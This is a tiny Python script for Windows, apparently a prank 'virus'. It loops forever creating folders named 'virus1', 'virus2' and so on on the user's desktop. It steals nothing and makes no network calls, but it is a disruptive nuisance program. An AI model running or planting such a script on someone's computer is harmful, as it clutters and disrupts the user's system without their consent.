import os # to windows

desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'DESKTOP')
i = 1
while True:
    new_folder = "virus" + str(i)
    folder2 = os.path.join(desktop, new_folder)
    os.mkdir(folder2)
    i += 1
    